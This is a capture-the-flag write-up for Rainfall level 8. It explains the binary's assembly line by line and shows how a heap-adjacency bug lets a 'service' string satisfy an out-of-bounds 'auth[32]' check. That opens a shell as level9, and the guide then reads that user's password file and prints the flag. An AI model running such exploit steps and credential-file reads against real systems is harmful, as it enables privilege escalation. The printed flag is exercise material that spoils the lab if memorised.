# 🎯 Rainfall — Level 8 Complete Guide
### Full assembly analysis, line by line, with register explanations
## 📖 Register dictionary — what are edi, esi, ebp?

Before reading ANY assembly, you must know what these words mean.
Think of registers as **tiny named boxes INSIDE the CPU** — not in RAM, inside the chip itself.

| Register | Full name | Simple meaning |
|----------|-----------|----------------|
| `eax` | Extended Accumulator | **The result box** — most operations put their result here |
| `ebx` | Extended Base | General storage |
| `ecx` | Extended Counter | **The counter box** — used for loops and string operations |
| `edx` | Extended Data | **Extra data box** — helper for math and function args |
| `esi` | Extended Source Index | **The FROM box** — points to where we are reading FROM |
| `edi` | Extended Destination Index | **The TO box** — points to where we are writing TO |
| `esp` | Extended Stack Pointer | **Top of the stack** — always points to the current top |
| `ebp` | Extended Base Pointer | **Bottom of the stack frame** — the anchor for local variables |
| `eip` | Extended Instruction Pointer | **The program counter** — which line executes next |

### Simple analogy for esi and edi

Imagine you are copying text from one paper to another:
- `esi` = your LEFT hand pointing at the **source paper** (where you READ from)
- `edi` = your RIGHT hand pointing at the **destination paper** (where you WRITE to)
- `ecx` = how many letters you still need to copy
- `repz cmps` = "repeat: compare one letter, move both hands forward, count down"

### Simple analogy for ebp and esp

Imagine a stack of plates:
- `esp` = points to the **top plate** (changes as you push/pop)
- `ebp` = points to the **bottom plate of THIS function** (fixed anchor)
- Local variables live between `ebp` and `esp`
- `[ebp-0x8]` means "8 bytes below the anchor" = a local variable

### What is `DWORD PTR`?

`DWORD PTR [eax]` means: "go to the address stored in eax, read 4 bytes there"
- `DWORD` = 4 bytes (32-bit value)
- `PTR` = pointer — treat the value as a memory address
- `[eax]` = the brackets mean "go THERE and read" (like following a sign)

---

## 🧒 Simple explanation (like you are 12)

Imagine a program that acts like a **security guard with a notebook**.
You can give it 4 commands:

| Command | What the guard does |
|---------|-------------------|
| `auth NAME` | Guard reserves a **tiny box (4 bytes)** and writes your name |
| `reset` | Guard **erases** the box completely |
| `service TEXT` | Guard writes your text in a **new box right next door** |
| `login` | Guard checks **position 32 of the auth box** — non-zero → opens shell! |

The trick: auth is only **4 bytes** long.
Position 32 of auth is **way outside** the auth box — it lands inside the service box!
Fill service with enough text → auth[32] becomes non-zero → shell opens!

---

## 🔬 How the program works in C

```c
char *service;   // global — address of service box in heap
char *auth;      // global — address of auth box in heap

int main() {
    char buff[128];   // your typed input (on the stack)

    while (1) {
        // Print both addresses every loop — our live map!
        printf("%p, %p \n", service, auth);

        // Read your input safely (max 128 bytes)
        if (fgets(buff, 128, stdin) == 0)
            break;

        // Command 1: "auth "
        if (strncmp(buff, "auth ", 5) == 0) {
            auth = malloc(4);           // ← ONLY 4 BYTES! critical!
            auth[0] = 0;
            if (strlen(&buff[5]) <= 30) {
                strcpy(auth, &buff[5]); // copy name into tiny box
            }
        }

        // Command 2: "reset"
        if (strncmp(buff, "reset", 5) == 0) {
            free(auth);                 // delete the auth box
        }

        // Command 3: "service"
        if (strncmp(buff, "service", 6) == 0) {
            service = strdup(&buff[7]); // new heap box right after auth!
        }

        // Command 4: "login" ← THE VULNERABILITY
        if (strncmp(buff, "login", 5) == 0) {
            if (auth[32] != 0) {        // reads 32 bytes PAST auth start!
                system("/bin/sh");      // THE PRIZE
            } else {
                fwrite("Password:\n", 10, 1, stdout);
            }
        }
    }
}
```

---

## 🔍 Full assembly analysis — line by line

### 📦 PLT section — the program's toolbox

```asm
08048410 <printf@plt>   → prints formatted text to screen
08048420 <free@plt>     → deletes a heap box
08048430 <strdup@plt>   → copies string into a NEW heap box
08048440 <fgets@plt>    → reads input safely (with size limit)
08048450 <fwrite@plt>   → writes raw bytes (used for "Password:\n")
08048460 <strcpy@plt>   → copies string — NO size limit (dangerous)
08048470 <malloc@plt>   → reserves a heap box
08048480 <system@plt>   → runs a shell command ← THE PRIZE
```

Seeing `malloc(4)` (tiny!) + `strdup` + `system` = **heap overlap logic bug**.
The vulnerability is in the *thinking* of the program, not a classic overflow.

---

### 🧠 main() — full line by line

#### Stack setup

```asm
8048564: push ebp
```
Save the caller's base pointer. Standard function entry.

```asm
8048565: mov ebp, esp
```
Set our own base pointer to current stack top.
Now `ebp` is our **anchor** — local variables are at `[ebp - something]`.

```asm
8048567: push edi
8048568: push esi
```
Save `edi` and `esi` registers — we will use them for string comparisons,
so we must save their old values first (polite to the caller).

```asm
8048569: and esp, 0xfffffff0
```
**Align the stack to 16 bytes.** CPUs work faster with aligned memory.
This rounds `esp` down to the nearest multiple of 16.

```asm
804856c: sub esp, 0xa0
```
`0xa0` = 160 decimal. **Reserve 160 bytes on the stack** for local variables.
This is where `buff[128]` lives (plus some extra alignment space).

```asm
8048572: jmp 8048575
8048574: nop
```
Jump over a `nop` (no-operation). This is the **start of the main loop**.
After each command is processed, the program jumps back to `8048574`.

---

#### Top of loop — printing the two pointers

```asm
8048575: mov ecx, DWORD PTR ds:0x8049ab0
```
Load the global variable `service` into `ecx`.
`ds:0x8049ab0` = a fixed memory address in the data segment = global variable.
At start this is 0 (nil).

```asm
804857b: mov edx, DWORD PTR ds:0x8049aac
```
Load the global variable `auth` into `edx`.
`ds:0x8049aac` = another fixed global address.
At start this is also 0 (nil).

```asm
8048581: mov eax, 0x8048810
```
Load the address of the format string `"%p, %p \n"` into `eax`.

```asm
8048586: mov DWORD PTR [esp+0x8], ecx   ← 3rd arg: service
804858a: mov DWORD PTR [esp+0x4], edx   ← 2nd arg: auth
804858e: mov DWORD PTR [esp], eax       ← 1st arg: format string
8048591: call printf@plt
```
Call `printf("%p, %p \n", auth, service)`.
Arguments are pushed onto the stack RIGHT-TO-LEFT.
This prints the current addresses of both pointers every loop iteration.

---

#### Reading your input

```asm
8048596: mov eax, ds:0x8049a80
```
Load `stdin` file handle.

```asm
804859f: mov DWORD PTR [esp+0x4], 0x80
```
`0x80` = 128 decimal. This is the **maximum bytes to read**.

```asm
80485a7: lea eax, [esp+0x20]
```
`lea` = Load Effective Address. Calculate the address of `buff`
(which lives at `esp+0x20` = 32 bytes into our stack frame).
Store that address in `eax`. Note: does NOT read from memory, just calculates address.

```asm
80485ab: mov DWORD PTR [esp], eax       ← 1st arg: buff
80485ae: call fgets@plt
```
Call `fgets(buff, 128, stdin)`. Safe — has a size limit.

```asm
80485b3: test eax, eax
80485b5: je 804872c
```
`test eax, eax` = check if `eax` is zero (sets CPU flags).
`je` = Jump if Equal (to zero). If `fgets` returned 0 (EOF/error) → jump to exit.

---

#### Command 1 — checking for "auth "

```asm
80485bb: lea eax, [esp+0x20]    ← eax = address of buff
80485bf: mov edx, eax           ← edx = buff (source for comparison)
80485c1: mov eax, 0x8048819     ← eax = address of string "auth "
80485c6: mov ecx, 0x5           ← ecx = 5 (compare 5 characters)
80485cb: mov esi, edx           ← esi = buff       (FROM: our input)
80485cd: mov edi, eax           ← edi = "auth "    (TO: the target string)
```

Now `esi` points to your input, `edi` points to "auth ".

```asm
80485cf: repz cmps BYTE PTR ds:[esi], BYTE PTR es:[edi]
```
This is the **string comparison instruction**. Breaking it down:
- `repz` = "repeat while Zero flag is set" (while characters are equal)
- `cmps` = compare string: compare `[esi]` vs `[edi]`, then advance both pointers
- `BYTE PTR` = compare one byte at a time
- `ecx` counts down: 5, 4, 3, 2, 1 — stops when ecx=0 or mismatch found

In simple words: **compare your input vs "auth " one letter at a time, 5 times**.

```asm
80485d1: seta dl     ← dl = 1 if esi > edi (your input comes after alphabetically)
80485d4: setb al     ← al = 1 if esi < edi (your input comes before alphabetically)
80485d7: mov ecx, edx
80485d9: sub cl, al
80485db: mov eax, ecx
80485dd: movsx eax, al
```
These lines compute the comparison result (like strcmp returns -1, 0, or 1).

```asm
80485e0: test eax, eax
80485e2: jne 8048642
```
`jne` = Jump if Not Equal. If the comparison was NOT zero (strings don't match)
→ skip the auth block entirely, jump to the next command check.

If we DID type "auth ...", fall through into:

```asm
80485e4: mov DWORD PTR [esp], 0x4
80485eb: call malloc@plt
```
`malloc(4)` — allocate **exactly 4 bytes** on the heap.
**This is the critical vulnerability seed.** Only 4 bytes for auth!

```asm
80485f0: mov ds:0x8049aac, eax
```
Save the returned heap address into the global `auth` pointer.

```asm
80485f5: mov eax, ds:0x8049aac
80485fa: mov DWORD PTR [eax], 0x0
```
`auth[0] = 0` — clear the first 4 bytes of the auth box.

```asm
8048600: lea eax, [esp+0x20]
8048604: add eax, 0x5
```
Point `eax` to `buff + 5` — this skips past "auth " (5 chars)
to get to YOUR name (e.g., "auth Alice" → points to "Alice").

```asm
8048607: mov DWORD PTR [esp+0x1c], 0xffffffff
```
Set up `ecx = -1` (0xffffffff) for the `repnz scas` length calculation below.

```asm
804861a: mov edi, edx     ← edi = &buff[5] (start of your name)
804861c: repnz scas al, BYTE PTR es:[edi]
```
`repnz scas` = scan string looking for a zero byte (null terminator).
This is how C calculates `strlen()` — scan until you find `\0`.
`edi` advances through your name until it hits the end.

```asm
804861e: mov eax, ecx     ← ecx counted down from -1
8048620: not eax          ← flip all bits
8048622: sub eax, 0x1     ← subtract 1
```
Math to convert the countdown into the actual string length.
Result in `eax` = length of your name.

```asm
8048625: cmp eax, 0x1e    ← compare length vs 30 (0x1e)
8048628: ja 8048642       ← if length > 30, skip the copy
```
Safety check: if your name is longer than 30 characters, skip `strcpy`.
If 30 or shorter, fall through to:

```asm
804862d: lea eax, [esp+0x20]
804862e: lea edx, [eax+0x5]    ← edx = &buff[5] = your name
8048631: mov eax, ds:0x8049aac ← eax = auth pointer
8048636: mov DWORD PTR [esp+0x4], edx  ← 2nd arg: source (your name)
804863a: mov DWORD PTR [esp], eax      ← 1st arg: dest (auth box)
804863d: call strcpy@plt
```
`strcpy(auth, &buff[5])` — copy your name into the auth box.
**The auth box is only 4 bytes** but your name could be up to 30 bytes.
This is an overflow! But the real exploit does NOT use this — we use the heap overlap instead.

---

#### Command 2 — checking for "reset"

```asm
8048648: mov eax, 0x804881f    ← address of string "reset"
804864d: mov ecx, 0x5          ← compare 5 characters
8048652: mov esi, edx          ← esi = buff (your input)
8048654: mov edi, eax          ← edi = "reset"
8048656: repz cmps             ← compare buff vs "reset"
8048669: jne 8048678           ← not "reset"? skip
```

If "reset" matched:

```asm
804866b: mov eax, ds:0x8049aac ← load auth pointer
8048670: mov DWORD PTR [esp], eax
8048673: call free@plt          ← free(auth) — delete the box
```
Free the auth heap allocation. The pointer still exists in the global
but the memory is gone — this creates a **use-after-free** condition
if you call login after reset without a new auth.

---

#### Command 3 — checking for "service"

```asm
804867e: mov eax, 0x8048825    ← address of string "service"
8048683: mov ecx, 0x6          ← compare 6 characters
8048688: mov esi, edx          ← esi = buff
804868a: mov edi, eax          ← edi = "service"
804868c: repz cmps             ← compare buff vs "service"
804869f: jne 80486b5           ← not "service"? skip
```

If "service" matched:

```asm
80486a1: lea eax, [esp+0x20]
80486a5: add eax, 0x7          ← skip past "service " (7 chars)
80486a8: mov DWORD PTR [esp], eax
80486ab: call strdup@plt        ← strdup(&buff[7])
```
`strdup()` allocates a **brand new heap box** and copies your text.
Because `malloc` fills memory sequentially, this lands
**right next to the auth box** — the key to our exploit!

```asm
80486b0: mov ds:0x8049ab0, eax ← save into global "service"
```
Store the new heap address in the service global pointer.

---

#### Command 4 — checking for "login" ← THE VULNERABILITY

```asm
80486bb: mov eax, 0x804882d    ← address of string "login"
80486c0: mov ecx, 0x5          ← compare 5 characters
80486c5: mov esi, edx          ← esi = buff
80486c7: mov edi, eax          ← edi = "login"
80486c9: repz cmps             ← compare buff vs "login"
80486dc: jne 8048574           ← not "login"? go back to loop top
```

If "login" matched — THE CRITICAL CHECK:

```asm
80486e2: mov eax, ds:0x8049aac    ← load auth pointer (e.g. 0x804a008)
80486e7: mov eax, DWORD PTR [eax+0x20]  ← read 4 bytes at auth + 0x20
```

`0x20` = **32 decimal**. This reads 4 bytes at address `auth + 32`.

**But auth was only 4 bytes!**
`auth` owns bytes 0-3. Byte 32 is **28 bytes past the end of auth**.
That memory belongs to whatever was allocated next = **service**!

```asm
80486ea: test eax, eax    ← is auth[32] zero?
80486ec: je 80486ff       ← if zero → jump to "Password:" branch
```

```asm
80486ee: mov DWORD PTR [esp], 0x8048833   ← address of "/bin/sh"
80486f5: call system@plt                  ← system("/bin/sh") ← SHELL!
80486fa: jmp 8048574                      ← go back to loop
```

If auth[32] is NOT zero → **we get a shell**!

```asm
80486ff: mov eax, ds:0x8049aa0            ← stdout handle
8048706: mov eax, 0x804883b              ← address of "Password:\n"
804870f: mov DWORD PTR [esp+0x8], 0xa   ← size: 10 bytes
8048717: mov DWORD PTR [esp+0x4], 0x1   ← count: 1
804871f: mov DWORD PTR [esp], eax
8048722: call fwrite@plt                 ← print "Password:\n"
8048727: jmp 8048574                     ← go back to loop
```

If auth[32] is zero → print "Password:" and loop.

---

#### Exit

```asm
804872c: nop
804872d: mov eax, 0x0         ← return value = 0
8048732: lea esp, [ebp-0x8]   ← restore stack pointer
8048735: pop esi               ← restore esi
8048736: pop edi               ← restore edi
8048737: pop ebp               ← restore base pointer
8048738: ret                   ← return to caller
```

Standard function exit — restores saved registers and returns.

---

## 🗺️ Heap memory layout — visualized

After typing `auth A` then `service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`:

```
HEAP MEMORY:

0x804a008         0x804a00c    0x804a010    0x804a018
|                 |            |            |
[ auth: 4 bytes  ][ heap meta: 8 bytes     ][ service box: 32+ bytes... ]
  A \0 \0 \0        (internal)                A A A A A A A A A A A A A A...
  ↑                                           ↑
  auth pointer                                service pointer

auth + 32 = 0x804a008 + 0x20 = 0x804a028
service starts at 0x804a018
service[16] = 0x804a028  ← exactly where auth[32] points!

So service needs at least 16 bytes to make auth[32] non-zero.
We use 32+ bytes for a safe margin.
```

---

## 🕵️ The full investigation story

### Phase 1 — First contact

```bash
ls -l
# -rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```
SUID bit → runs as level9 → worth exploiting.

```bash
./level8
# (nil), (nil)
```
Prints two nil pointers and waits. Interactive program.
No crash. Needs commands, not just one input.

```bash
hello
# (nil), (nil)
```
Keeps looping. Unknown commands are silently ignored.
The two nils are global pointers — currently empty.

---

### Phase 2 — Reading the PLT

Spotted `malloc` + `free` + `strdup` + `system` together.
- `malloc(4)` = tiny allocation → heap layout matters
- `strdup` = new heap box right after auth
- `system` = the prize, triggered by a condition
- No `gets()` or obvious stack overflow → **logic bug**, not memory corruption

---

### Phase 3 — Finding the bug in the assembly

Reading the login block:

```asm
80486e7: mov eax, DWORD PTR [eax+0x20]
```

`0x20` = 32. This reads `auth + 32`.
But auth was allocated with `malloc(4)` — only 4 bytes!

This is the bug: **the code checks 32 bytes past auth, but auth only owns 4 bytes**.
Those 32 bytes land inside the service box.

---

### Phase 4 — Proving it with live addresses

Ran the program and typed commands to watch the addresses:

```
./level8
(nil), (nil)              ← both empty

auth A
0x804a008, (nil)          ← auth created at 0x804a008

service AAAAAAAAAAAAAAAA
0x804a008, 0x804a018      ← service created at 0x804a018
```

Gap between auth and service: `0x804a018 - 0x804a008 = 0x10 = 16 bytes`

So `auth + 32 = 0x804a028`.
Service starts at `0x804a018`.
Service needs `0x804a028 - 0x804a018 = 16 bytes` to reach auth+32.

We use 32 bytes to be safe. Any non-zero byte there = shell!

---

### Phase 5 — How we arrived at the exact commands

```
./level8
```
Start the program — interactive loop begins.

```
auth A
```
- Matches `strncmp(buff, "auth ", 5)` → enters auth block
- `malloc(4)` → creates tiny 4-byte heap box
- Copies "A\n" into it (short enough, passes the <=30 check)
- `auth` global now = `0x804a008`

```
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
- Matches `strncmp(buff, "service", 6)` → enters service block
- Skips past "service " (7 chars) → takes the 32 A's
- `strdup("AAAA...32 A's")` → allocates new heap box right after auth
- `service` global now = `0x804a018`
- Our 32 A's fill bytes from `0x804a018` to `0x804a038`
- This covers `auth+32 = 0x804a028` → that byte is now `'A'` = 0x41 ≠ 0 ✓

```
login
```
- Matches `strncmp(buff, "login", 5)` → enters login block
- Reads `auth[32]` = reads at address `0x804a008 + 32 = 0x804a028`
- That address is inside the service box = `'A'` = 0x41
- `test eax, eax` → not zero!
- `je` does NOT jump
- Falls through to `system("/bin/sh")` ← SHELL!

---

## ✅ Method 1 — Interactive (type commands manually)

```bash
./level8
```

Type each line and press Enter:

```
auth A
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

Shell opens. Then:

```bash
whoami
cat /home/user/level9/.pass
```

---

## ✅ Method 2 — Piped input (automated, one command)

```bash
(echo "auth A"; echo "service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; echo "login"; cat) | ./level8
```

The `cat` at the end keeps stdin open so the shell stays alive.
Type `whoami` and `cat /home/user/level9/.pass` after.

---

## 🏁 The flag

```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Log in as level9:

```bash
su level9
# password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## 🗺️ Quick reference

```bash
# Start the program
./level8
# → (nil), (nil)

# Step 1: create auth box (4 bytes)
auth A
# → 0x804a008, (nil)

# Step 2: create service box right after auth (32+ bytes)
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# → 0x804a008, 0x804a018

# Step 3: trigger login — auth[32] is now inside service = non-zero
login
# → shell opens!

whoami
# → level9

cat /home/user/level9/.pass
# → c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## 📋 Deduction chain — 15 steps from zero to flag

```
1.  SUID bit             → runs as level9 → worth exploiting
2.  Prints (nil),(nil)   → two global pointers, interactive loop
3.  Random input ignored → must find valid commands
4.  PLT analysis         → malloc+free+strdup+system → heap logic bug
5.  No gets() found      → NOT a stack overflow → logic/heap vulnerability
6.  Found malloc(4)      → auth is only 4 bytes → dangerously small
7.  Found strdup()       → service goes to heap right next to auth
8.  Found login check    → reads [eax+0x20] = auth+32 → bug!
9.  auth only 4 bytes    → auth+32 is 28 bytes PAST the end of auth
10. auth+32 = service+16 → service data reaches auth[32]
11. Live proof           → addresses show gap = 16 bytes
12. Need 16+ bytes       → use 32 for safe margin
13. auth A               → creates 4-byte heap box
14. service AAAA...32    → fills memory including auth[32] with 'A'
15. login                → auth[32]='A'=0x41≠0 → system("/bin/sh") → flag!
```

---

## 📚 Key words to remember

| Word | Simple meaning |
|------|----------------|
| Register | Tiny named box inside the CPU (eax, esi, edi...) |
| esi | Source Index — points to where we read FROM |
| edi | Destination Index — points to where we write TO |
| ecx | Counter — used for loops and string lengths |
| ebp | Base Pointer — anchor for local variables in a function |
| esp | Stack Pointer — top of the current stack |
| repz cmps | Repeat: compare bytes pointed by esi and edi, advance both |
| repnz scas | Repeat: scan for zero byte (used to find string length) |
| lea | Load Effective Address — calculate an address, don't read memory |
| DWORD PTR | Read 4 bytes from the address in brackets |
| ds: | Data Segment — where global variables live |
| Heap | Memory area where malloc/strdup allocate boxes |
| Logic bug | The program's thinking is wrong, not just its memory use |
| malloc(4) | Reserve exactly 4 bytes on the heap |
| strdup() | Copy string into a brand new heap box |
| Heap overlap | Two adjacent heap boxes — one's range covers another's data |
| auth[32] | Reading 32 bytes past auth start — way outside the 4-byte box! |
| (nil) | Pointer is empty (address = 0, nothing allocated) |
| %p | Printf format: print a pointer as hex address |
| SUID | Binary runs with another user's permissions |
| system() | Runs a shell command — the prize in this level |

---

*Guide written for Rainfall project — 1337 school*